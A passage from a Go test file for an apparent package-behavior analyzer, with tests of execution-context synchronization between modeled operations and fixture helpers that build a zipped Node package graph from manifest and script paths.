				if plan.disposition == nodePackageEntryResolved {
					t.Fatalf("malformed/ineligible nodes produced a resolved entry: %#v", plans)
				}
			}
		})
	}
}

func TestSynchronizeOperationRelationExecutionAfterLateRootResolution(t *testing.T) {
	connected := connectedExecutionContext([]string{"root-0001"}, nil)
	operation := func(id string, execution behavior.ExecutionContext) behavior.ModeledOperation {
		return behavior.ModeledOperation{ID: id, Execution: execution}
	}
	relation := behavior.OperationRelation{
		ID:        "relation-0001",
		Kind:      behavior.RelationPipesTo,
		From:      behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-0001"),
		To:        behavior.IDRelationEndpoint(behavior.RelationEndpointOperation, "operation-0002"),
		Execution: unknownExecutionContext(),
	}

	t.Run("compatible endpoints", func(t *testing.T) {
		graph := behavior.Graph{
			Operations: []behavior.ModeledOperation{operation("operation-0001", connected), operation("operation-0002", connected)},
			Relations:  []behavior.OperationRelation{relation},
		}
		synchronizeOperationRelationExecution(&graph)
		if len(graph.Relations) != 1 || !sameExecutionContext(graph.Relations[0].Execution, connected) {
			t.Fatalf("compatible precomputed relation was not promoted: %#v", graph.Relations)
		}
	})

	t.Run("incompatible endpoints", func(t *testing.T) {
		graph := behavior.Graph{
			Operations: []behavior.ModeledOperation{operation("operation-0001", connected), operation("operation-0002", unknownExecutionContext())},
			Relations:  []behavior.OperationRelation{relation},
		}
		synchronizeOperationRelationExecution(&graph)
		if len(graph.Relations) != 0 || countCoverageContaining(graph.Coverage, "operation-relation-execution-context", "incompatible execution ownership") != 1 {
			t.Fatalf("incompatible relation was retained or omitted silently: relations=%#v coverage=%#v", graph.Relations, graph.Coverage)
		}
	})
}

func nodePackagePlanContents(manifest string) []artifact.Content {
	return []artifact.Content{
		{NodeID: "node-manifest", ScopeID: "scope-manifest", LogicalPath: "fixture.zip!package/package.json", Kind: "manifest", Role: "runtime", Data: []byte(manifest)},
		{NodeID: "node-main", ScopeID: "scope-main", LogicalPath: "fixture.zip!package/dist/main.js", Kind: "script", Role: "generated/build"},
		{NodeID: "node-index", ScopeID: "scope-index", LogicalPath: "fixture.zip!package/dist/index.js", Kind: "script", Role: "generated/build"},
		{NodeID: "node-export", ScopeID: "scope-export", LogicalPath: "fixture.zip!package/dist/export.js", Kind: "script", Role: "generated/build"},
		{NodeID: "node-feature", ScopeID: "scope-feature", LogicalPath: "fixture.zip!package/dist/feature.js", Kind: "script", Role: "generated/build"},
	}
}

func nodePackageRunFixture(t *testing.T, manifest, targetLogical, targetSource string) (artifact.Graph, []artifact.Content, string, string) {
	t.Helper()
	var artifacts artifact.Graph
	archiveID := artifacts.AddNode(artifact.Node{LogicalPath: "fixture.zip", Kind: "zip", SourceRole: "target", AnalyzeStatus: "analyzed"})
	manifestLogical := "fixture.zip!package/package.json"
	manifestID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: manifestLogical, Kind: "manifest", MediaType: "text/plain", SourceRole: "runtime", AnalyzeStatus: "analyzed"})
	targetLogical = "fixture.zip!package/" + targetLogical
	targetID := artifacts.AddNode(artifact.Node{ParentID: archiveID, LogicalPath: targetLogical, Kind: "script", MediaType: "text/plain", SourceRole: "generated/build", AnalyzeStatus: "analyzed"})
	artifacts.AddEdge(archiveID, manifestID, "contains")
	artifacts.AddEdge(archiveID, targetID, "contains")
	return artifacts, []artifact.Content{
		{NodeID: manifestID, LogicalPath: manifestLogical, Kind: "manifest", MediaType: "text/plain", Role: "runtime", Data: []byte(manifest)},
		{NodeID: targetID, LogicalPath: targetLogical, Kind: "script", MediaType: "text/plain", Role: "generated/build", Data: []byte(targetSource)},
	}, manifestID, targetID
}

func hasConnectedOperationResource(operations []behavior.ModeledOperation, rootID, value string) bool {
	for _, operation := range operations {
		if operation.Execution.Connectivity == behavior.ConnectivityConnected && slices.Contains(operation.Execution.ExecutionRootIDs, rootID) && operationResourceValue(operation, value) {
			return true
		}
	}
	return false
}

func operationResourceValue(operation behavior.ModeledOperation, value string) bool {
	for _, binding := range operation.ResourceBindings {
		if binding.Resource.Value == value {
			return true
		}
	}
	return false
}

func countCoverageStatusContaining(coverage []behavior.Coverage, area, status, detail string) int {
	count := 0
	for _, item := range coverage {
		if item.AnalysisArea == area && item.Status == status && strings.Contains(item.Detail, detail) {
			count++
		}
	}
	return count
}
